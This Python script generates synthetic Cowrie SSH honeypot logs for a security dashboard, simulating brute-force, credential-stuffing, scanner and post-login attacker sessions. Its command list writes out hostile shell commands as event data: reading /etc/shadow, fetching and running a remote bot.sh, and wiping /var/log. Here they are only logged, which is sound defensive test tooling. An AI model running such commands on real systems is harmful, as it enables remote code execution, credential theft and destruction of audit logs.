from __future__ import annotations

import argparse
import gzip
import hashlib
import json
import math
import random
import sys
from collections.abc import Iterator
from dataclasses import dataclass
from datetime import UTC, date, datetime, time, timedelta
from decimal import Decimal
from ipaddress import IPv4Network, ip_address
from pathlib import Path
from typing import Any

THIS_DIR = Path(__file__).resolve().parent
REPO_ROOT = THIS_DIR.parent.parent
DATA_DIR = THIS_DIR / "data"

# Make functions/shared importable when run as a script
sys.path.insert(0, str(REPO_ROOT / "dashboard"))

SENSOR_NAME = "honeypot"
SENSOR_UUID = "c3ccafbe-40f0-11f1-8f67-88a29e085d67"
HONEYPOT_DST_IP = "192.168.1.253"
HONEYPOT_DST_PORT = 2222

COMMANDS_INTERESTING = [
    "uname -a",
    "id",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "wget http://185.62.190.99/bot.sh",
    "curl -O http://185.62.190.99/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh",
    "crontab -l",
    "ps aux",
    "w",
    "uptime",
    "ifconfig",
    "ip addr",
    "netstat -tuln",
    "df -h",
    "free -m",
    "history",
    "ls -la /tmp",
    "rm -rf /var/log/*",
]

KEX_ALGS = [
    "curve25519-sha256",
    "curve25519-sha256@libssh.org",
    "ecdh-sha2-nistp256",
    "ecdh-sha2-nistp384",
    "ecdh-sha2-nistp521",
    "diffie-hellman-group-exchange-sha256",
]
KEY_ALGS = [
    "ssh-ed25519",
    "rsa-sha2-512",
    "rsa-sha2-256",
    "ssh-rsa",
    "ecdsa-sha2-nistp256",
]
ENC_ALGS = [
    "chacha20-poly1305@openssh.com",
    "aes128-ctr",
    "aes192-ctr",
    "aes256-ctr",
    "aes128-gcm@openssh.com",
    "aes256-gcm@openssh.com",
]
MAC_ALGS = [
    "umac-64-etm@openssh.com",
    "umac-128-etm@openssh.com",
    "hmac-sha2-256-etm@openssh.com",
    "hmac-sha2-512-etm@openssh.com",
]
COMP_ALGS = ["none", "zlib@openssh.com", "zlib"]

CLIENT_VERSIONS = [
    "SSH-2.0-OpenSSH_for_Windows_9.5",
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-libssh-0.9.6",
    "SSH-2.0-PuTTY_Release_0.78",
    "SSH-2.0-Go",
    "SSH-2.0-paramiko_3.4.0",
]


@dataclass(frozen=True)
class AsnPool:
    asn: int
    asn_org: str
    country: str
    weight: int
    networks: tuple[IPv4Network, ...]


@dataclass
class Cohort:
    name: str  # "brute_force" | "credential_stuffing" | "scanner" | "interesting"
    weight: float


COHORTS: tuple[Cohort, ...] = (
    Cohort("brute_force", 0.80),
    Cohort("credential_stuffing", 0.15),
    Cohort("scanner", 0.04),
    Cohort("interesting", 0.01),
)


def _load_lines(path: Path) -> list[str]:
    return [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


def _load_asn_pools(path: Path) -> list[AsnPool]:
    raw = json.loads(path.read_text(encoding="utf-8"))
    pools: list[AsnPool] = []
    for entry in raw["pools"]:
        nets = tuple(IPv4Network(c) for c in entry["cidrs"])
        pools.append(
            AsnPool(
                asn=int(entry["asn"]),
                asn_org=str(entry["asn_org"]),
                country=str(entry["country"]),
                weight=int(entry["weight"]),
                networks=nets,
            )
        )
    return pools


def _hour_weight(hour: int) -> float:
    """Sinusoidal hour-of-day weighting peaking at ~03:00 UTC.

    Returns a multiplier in roughly [0.5, 1.5]. Real internet attack
    traffic clusters in the small hours UTC; this mirrors that pattern.
    """
    return 1.0 + 0.5 * math.cos((hour - 3) / 24.0 * 2 * math.pi)


def _pick_asn(rng: random.Random, pools: list[AsnPool]) -> AsnPool:
    total = sum(p.weight for p in pools)
    pick = rng.uniform(0, total)
    acc = 0.0
    for pool in pools:
        acc += pool.weight
        if pick <= acc:
            return pool
    return pools[-1]


def _ip_in(rng: random.Random, network: IPv4Network) -> str:
    # Skip network/broadcast
    if network.num_addresses <= 2:
        return str(network.network_address)
    offset = rng.randint(1, network.num_addresses - 2)
    return str(ip_address(int(network.network_address) + offset))


def _format_ts(dt: datetime) -> str:
    # Cowrie writes ISO 8601 with microseconds + 'Z'
    return dt.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond:06d}Z"


def _hassh(rng: random.Random) -> str:
    return hashlib.md5(rng.randbytes(16)).hexdigest()


def _session_id(rng: random.Random) -> str:
    return rng.randbytes(6).hex()


def _shasum(rng: random.Random) -> str:
    return hashlib.sha256(rng.randbytes(32)).hexdigest()


def _common_event_fields(
    *, eventid: str, ts: datetime, src_ip: str, session: str
) -> dict[str, Any]:
    return {
        "eventid": eventid,
        "timestamp": _format_ts(ts),
        "src_ip": src_ip,
        "session": session,
        "sensor": SENSOR_NAME,
    }


def _connect_event(
    *, ts: datetime, src_ip: str, src_port: int, session: str
) -> dict[str, Any]:
    return {
        **_common_event_fields(eventid="cowrie.session.connect", ts=ts, src_ip=src_ip, session=session),
        "src_port": src_port,
        "dst_ip": HONEYPOT_DST_IP,
        "dst_port": HONEYPOT_DST_PORT,
        "protocol": "ssh",
        "uuid": SENSOR_UUID,
        "message": (
            f"New connection: {src_ip}:{src_port} "
            f"({HONEYPOT_DST_IP}:{HONEYPOT_DST_PORT}) [session: {session}]"
        ),
    }


def _client_version_event(
    *, ts: datetime, src_ip: str, session: str, version: str
) -> dict[str, Any]:
    return {
        **_common_event_fields(eventid="cowrie.client.version", ts=ts, src_ip=src_ip, session=session),
        "version": version,
    }


def _client_kex_event(
    *, rng: random.Random, ts: datetime, src_ip: str, session: str
) -> dict[str, Any]:
    return {
        **_common_event_fields(eventid="cowrie.client.kex", ts=ts, src_ip=src_ip, session=session),
        "hassh": _hassh(rng),
        "kexAlgs": rng.sample(KEX_ALGS, k=min(4, len(KEX_ALGS))),
        "keyAlgs": rng.sample(KEY_ALGS, k=min(3, len(KEY_ALGS))),
        "encCS": rng.sample(ENC_ALGS, k=min(3, len(ENC_ALGS))),
        "macCS": rng.sample(MAC_ALGS, k=min(2, len(MAC_ALGS))),
        "compCS": rng.sample(COMP_ALGS, k=min(2, len(COMP_ALGS))),
    }


def _login_event(
    *,
    eventid: str,
    ts: datetime,
    src_ip: str,
    session: str,
    username: str,
    password: str,
) -> dict[str, Any]:
    verb = "succeeded" if eventid.endswith("success") else "failed"
    return {
        **_common_event_fields(eventid=eventid, ts=ts, src_ip=src_ip, session=session),
        "username": username,
        "password": password,
        "message": f"login attempt [{username}/{password}] {verb}",
    }


def _command_event(
    *, ts: datetime, src_ip: str, session: str, cmd: str
) -> dict[str, Any]:
    return {
        **_common_event_fields(eventid="cowrie.command.input", ts=ts, src_ip=src_ip, session=session),
        "input": cmd,
        "message": f"CMD: {cmd}",
    }


def _file_download_event(
    *, rng: random.Random, ts: datetime, src_ip: str, session: str, url: str
) -> dict[str, Any]:
    sha = _shasum(rng)
    return {
        **_common_event_fields(eventid="cowrie.session.file_download", ts=ts, src_ip=src_ip, session=session),
        "url": url,
        "outfile": f"var/dl/{sha}",
        "shasum": sha,
        "message": f"Downloaded URL ({url}) with SHA-256 {sha} to var/dl/{sha}",
    }


def _session_closed_event(
    *, ts: datetime, src_ip: str, session: str, duration: float
) -> dict[str, Any]:
    return {
        **_common_event_fields(eventid="cowrie.session.closed", ts=ts, src_ip=src_ip, session=session),
        "duration": duration,
        "message": f"Connection lost after {duration:.1f} seconds",
    }


def _build_session(
    *,
    rng: random.Random,
    cohort: Cohort,
    start: datetime,
    src_ip: str,
    src_port: int,
    usernames: list[str],
    passwords: list[str],
) -> list[dict[str, Any]]:
    """Generate a realistic event sequence for one session.

    Cohort-specific rules:
      brute_force: 1 IP, 10-200 attempts, single dictionary user, all fail
      credential_stuffing: 1 IP, 5-30 attempts, many usernames per IP, 0-2 succeed
      scanner: connect + version + immediate disconnect (< 2s)
      interesting: login succeeds, runs commands, drops a fake binary
    """
    session = _session_id(rng)
    events: list[dict[str, Any]] = []
    ts = start

    events.append(_connect_event(ts=ts, src_ip=src_ip, src_port=src_port, session=session))
    ts += timedelta(milliseconds=rng.randint(50, 250))

    events.append(
        _client_version_event(
            ts=ts, src_ip=src_ip, session=session, version=rng.choice(CLIENT_VERSIONS)
        )
    )
    ts += timedelta(milliseconds=rng.randint(20, 150))

    events.append(_client_kex_event(rng=rng, ts=ts, src_ip=src_ip, session=session))
    ts += timedelta(milliseconds=rng.randint(50, 300))

    if cohort.name == "scanner":
        # Scanner: drop immediately
        duration_s = rng.uniform(0.3, 1.8)
        end_ts = start + timedelta(seconds=duration_s)
        events.append(
            _session_closed_event(
                ts=end_ts, src_ip=src_ip, session=session, duration=round(duration_s, 1)
            )
        )
        return events

    if cohort.name == "brute_force":
        attempt_count = rng.randint(10, 200)
        username = rng.choice(usernames[:30])  # bias toward common
        for _ in range(attempt_count):
            ts += timedelta(milliseconds=rng.randint(150, 1200))
            events.append(
                _login_event(
                    eventid="cowrie.login.failed",
                    ts=ts,
                    src_ip=src_ip,
                    session=session,
                    username=username,
                    password=rng.choice(passwords),
                )
            )
        duration_s = (ts - start).total_seconds() + rng.uniform(0.1, 1.0)
        events.append(
            _session_closed_event(
                ts=ts + timedelta(seconds=0.5),
                src_ip=src_ip,
                session=session,
                duration=round(duration_s, 1),
            )
        )
        return events

    if cohort.name == "credential_stuffing":
        attempt_count = rng.randint(5, 30)
        success_n = rng.choices([0, 1, 2], weights=[80, 18, 2], k=1)[0]
        success_indices = set(rng.sample(range(attempt_count), k=min(success_n, attempt_count)))
        for i in range(attempt_count):
            ts += timedelta(milliseconds=rng.randint(200, 2500))
            uname = rng.choice(usernames)
            pwd = rng.choice(passwords)
            eid = "cowrie.login.success" if i in success_indices else "cowrie.login.failed"
            events.append(
                _login_event(
                    eventid=eid,
                    ts=ts,
                    src_ip=src_ip,
                    session=session,
                    username=uname,
                    password=pwd,
                )
            )
        duration_s = (ts - start).total_seconds() + rng.uniform(0.5, 5.0)
        events.append(
            _session_closed_event(
                ts=ts + timedelta(seconds=0.5),
                src_ip=src_ip,
                session=session,
                duration=round(duration_s, 1),
            )
        )
        return events

    # interesting cohort: login succeeds, runs commands, drops a binary
    ts += timedelta(milliseconds=rng.randint(300, 1500))
    username = rng.choice(["root", "admin", "ubuntu"])
    password = rng.choice(passwords[:30])
    events.append(
        _login_event(
            eventid="cowrie.login.success",
            ts=ts,
            src_ip=src_ip,
            session=session,
            username=username,
            password=password,
        )
    )
    cmd_count = rng.randint(3, 8)
    chosen_cmds = rng.sample(COMMANDS_INTERESTING, k=min(cmd_count, len(COMMANDS_INTERESTING)))
    fake_url = None
    for cmd in chosen_cmds:
        ts += timedelta(seconds=rng.uniform(0.5, 6.0))
        events.append(_command_event(ts=ts, src_ip=src_ip, session=session, cmd=cmd))
        if cmd.startswith("wget ") or cmd.startswith("curl "):
            fake_url = cmd.split(" ", 1)[1].lstrip("-O ").strip()
    if fake_url:
        ts += timedelta(seconds=rng.uniform(0.5, 3.0))
        events.append(
            _file_download_event(
                rng=rng, ts=ts, src_ip=src_ip, session=session, url=fake_url
            )
        )
    duration_s = (ts - start).total_seconds() + rng.uniform(2.0, 30.0)
    events.append(
        _session_closed_event(
            ts=ts + timedelta(seconds=0.5),
            src_ip=src_ip,
            session=session,
            duration=round(duration_s, 1),
        )
    )
    return events


def _pick_cohort(rng: random.Random) -> Cohort:
    pick = rng.random()
    acc = 0.0
    for cohort in COHORTS:
        acc += cohort.weight
        if pick <= acc:
            return cohort
    return COHORTS[-1]


def _pick_session_start(
    rng: random.Random, *, days: int, now: datetime
) -> datetime:
    """Pick a session-start timestamp uniformly across [now - days, now],
    weighted by hour-of-day to peak overnight UTC.
    """
    # Rejection-sample on hour weight (peak ~1.5, trough ~0.5, so accept rate ≥ 1/3).
    while True:
        offset_seconds = rng.uniform(0, days * 86400)
        candidate = now - timedelta(seconds=offset_seconds)
        weight = _hour_weight(candidate.hour)
        if rng.uniform(0, 1.5) <= weight:
            return candidate


def generate_events(
    *,
    target_events: int,
    days: int,
    seed: int,
    asn_pools: list[AsnPool],
    usernames: list[str],
    passwords: list[str],
    now: datetime | None = None,
) -> Iterator[dict[str, Any]]:
    """Yield Cowrie events until at least `target_events` have been emitted.

    Generation is session-driven: pick a cohort, build a session, yield its
    events. Sessions span 1-300 seconds; events within a session are
    timestamped monotonically.
    """
    rng = random.Random(seed)
    now = now or datetime.now(UTC)
    emitted = 0

    while emitted < target_events:
        cohort = _pick_cohort(rng)
        pool = _pick_asn(rng, asn_pools)
        network = rng.choice(pool.networks)
        src_ip = _ip_in(rng, network)
        src_port = rng.randint(1024, 65535)
        start = _pick_session_start(rng, days=days, now=now)

        for event in _build_session(
            rng=rng,
            cohort=cohort,
            start=start,
            src_ip=src_ip,
            src_port=src_port,
            usernames=usernames,
            passwords=passwords,
        ):
            # Attach synthetic GeoIP enrichment from the chosen pool. The
            # ingest Lambda passes these through to the stored event when
            # they're present (synthetic path); when absent (real Pi data
            # in Phase 10+), the ingest Lambda falls back to its bundled
            # MaxMind layer.
            event["country"] = pool.country
            event["asn"] = pool.asn
            event["asn_org"] = pool.asn_org
            yield event
            emitted += 1
            if emitted >= target_events:
                return


def write_per_day_files(
    events: list[dict[str, Any]], out_dir: Path, *, seed: int
) -> dict[str, Any]:
    """Sort events by timestamp, group by UTC date, write one .json.gz per day.

    Returns a manifest dict (also written as manifest.json in the out_dir).
    """
    out_dir.mkdir(parents=True, exist_ok=True)
    events_sorted = sorted(events, key=lambda e: e["timestamp"])

    by_day: dict[str, list[dict[str, Any]]] = {}
    for event in events_sorted:
        day_key = event["timestamp"][:10]  # YYYY-MM-DD prefix
        by_day.setdefault(day_key, []).append(event)

    files: list[dict[str, Any]] = []
    for day_key, day_events in sorted(by_day.items()):
        out_path = out_dir / f"cowrie.{day_key}.json.gz"
        ndjson = "\n".join(json.dumps(e) for e in day_events).encode("utf-8")
        with gzip.open(out_path, "wb") as fh:
            fh.write(ndjson)
        files.append(
            {
                "path": out_path.name,
                "events": len(day_events),
                "sha256": hashlib.sha256(ndjson).hexdigest(),
            }
        )

    manifest = {
        "generator_version": "0.1.0",
        "seed": seed,
        "events_total": len(events_sorted),
        "files": files,
    }
    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return manifest


def upload_to_s3(
    events: list[dict[str, Any]], bucket: str, *, seed: int, profile: str | None
) -> None:
    """Upload events to S3 in the same daily-partitioned shape as write_per_day_files,
    but under the production prefix s3://<bucket>/raw/YYYY/MM/DD/HH/synthetic-<seed>-<idx>.json.gz.

    This exercises the real ingest path end-to-end (PROJECT_PLAN.md §8).
    """
    import boto3  # local import so file-only runs don't require boto3 at import time

    session = boto3.Session(profile_name=profile) if profile else boto3.Session()
    s3 = session.client("s3")

    events_sorted = sorted(events, key=lambda e: e["timestamp"])
    by_hour: dict[str, list[dict[str, Any]]] = {}
    for event in events_sorted:
        ts = event["timestamp"]
        hour_key = ts[:13]  # YYYY-MM-DDTHH
        by_hour.setdefault(hour_key, []).append(event)

    for idx, (hour_key, hour_events) in enumerate(sorted(by_hour.items())):
        ndjson = "\n".join(json.dumps(e) for e in hour_events).encode("utf-8")
        gz = gzip.compress(ndjson)
        # YYYY-MM-DDTHH → YYYY/MM/DD/HH
        date_part, hour_part = hour_key.split("T")
        y, m, d = date_part.split("-")
        key = f"raw/{y}/{m}/{d}/{hour_part}/synthetic-{seed}-{idx:04d}.json.gz"
        s3.put_object(Bucket=bucket, Key=key, Body=gz, ContentEncoding="gzip", ContentType="application/x-ndjson")


def inject_to_dynamodb(
    events: list[dict[str, Any]], table_name: str, *, profile: str | None
) -> None:
    """Direct BatchWriteItem injection into the dashboard DynamoDB table.

    Used for local dev only — exercising the ingest Lambda via S3 is preferred.
    """
    import boto3  # local import

    session = boto3.Session(profile_name=profile) if profile else boto3.Session()
    ddb = session.resource("dynamodb")
    table = ddb.Table(table_name)

    def _to_ddb(value: Any) -> Any:
        # DynamoDB's resource interface rejects native floats.
        if isinstance(value, float):
            return Decimal(str(value))
        if isinstance(value, list):
            return [_to_ddb(v) for v in value]
        if isinstance(value, dict):
            return {k: _to_ddb(v) for k, v in value.items()}
        return value

    with table.batch_writer() as batch:
        for event in events:
            ingest_id = hashlib.sha1(
                f"{event['session']}|{event['timestamp']}|{event['eventid']}".encode()
            ).hexdigest()
            item: dict[str, Any] = {
                "pk": f"SESSION#{event['session']}",
                "sk": f"{event['timestamp']}#{event['eventid']}",
                "gsi1pk": f"IP#{event['src_ip']}",
                "gsi1sk": event["timestamp"],
                "gsi2pk": f"DAY#{event['timestamp'][:10]}",
                "gsi2sk": f"{event['timestamp']}#SESSION#{event['session']}",
                "type": "EVENT",
                "ingest_id": f"sha1:{ingest_id}",
                "ts": event["timestamp"],
                **event,
            }
            batch.put_item(Item={k: _to_ddb(v) for k, v in item.items()})


def _parse_anchor(value: str) -> datetime:
    """Parse an ISO 8601 anchor-time argument; require explicit UTC."""
    parsed = datetime.fromisoformat(value.replace("Z", "+00:00"))
    if parsed.tzinfo is None:
        raise argparse.ArgumentTypeError(
            "--anchor-time must include a UTC offset (e.g. 2026-04-28T00:00:00Z)"
        )
    return parsed.astimezone(UTC)


def resolve_anchor(
    *, seed_supplied: bool, anchor_time: datetime | None
) -> datetime:
    """Determine the wall-clock anchor used for timestamp generation.

    Precedence (per the determinism contract in the module docstring):
      1. Explicit --anchor-time wins.
      2. Else if --seed was supplied, default to midnight UTC of today.
      3. Else use datetime.now(timezone.utc).
    """
    if anchor_time is not None:
        return anchor_time
    if seed_supplied:
        return datetime.combine(date.today(), time.min, tzinfo=UTC)
    return datetime.now(UTC)


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Synthetic Cowrie data generator (PROJECT_PLAN.md §8)")
    parser.add_argument("--events", type=int, default=10_000, help="Total events to generate")
    parser.add_argument("--days", type=int, default=7, help="Distribute across the last N days")
    parser.add_argument("--seed", type=int, default=None, help="Deterministic random seed; without --anchor-time, anchor defaults to midnight UTC today")
    parser.add_argument(
        "--anchor-time",
        dest="anchor_time",
        type=_parse_anchor,
        default=None,
        help="ISO 8601 UTC timestamp anchoring all generated timestamps. With --seed, makes runs byte-identical.",
    )
    parser.add_argument("--out", type=Path, help="Write daily .json.gz files into this directory")
    parser.add_argument("--upload-s3", dest="upload_s3", help="S3 bucket to upload synthetic files into")
    parser.add_argument("--inject-ddb", dest="inject_ddb", action="store_true", help="Direct DynamoDB BatchWriteItem injection")
    parser.add_argument("--table", default="dram-soc-honeypot", help="DynamoDB table for --inject-ddb")
    parser.add_argument("--profile", help="AWS profile (defaults to environment)")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)

    if not (args.out or args.upload_s3 or args.inject_ddb):
        print(
            "must pass at least one of --out / --upload-s3 / --inject-ddb",
            file=sys.stderr,
        )
        return 2

    asn_pools = _load_asn_pools(DATA_DIR / "asn_pools.json")
    usernames = _load_lines(DATA_DIR / "usernames.txt")
    passwords = _load_lines(DATA_DIR / "passwords.txt")

    seed = args.seed if args.seed is not None else 42
    anchor = resolve_anchor(
        seed_supplied=args.seed is not None,
        anchor_time=args.anchor_time,
    )

    events = list(
        generate_events(
            target_events=args.events,
            days=args.days,
            seed=seed,
            asn_pools=asn_pools,
            usernames=usernames,
            passwords=passwords,
            now=anchor,
        )
    )

    if args.out:
        manifest = write_per_day_files(events, args.out, seed=seed)
        print(
            f"wrote {manifest['events_total']} events across "
            f"{len(manifest['files'])} files to {args.out}"
        )
    if args.upload_s3:
        upload_to_s3(events, args.upload_s3, seed=seed, profile=args.profile)
        print(f"uploaded {len(events)} events to s3://{args.upload_s3}/raw/")
    if args.inject_ddb:
        inject_to_dynamodb(events, args.table, profile=args.profile)
        print(f"injected {len(events)} events into DynamoDB table {args.table}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
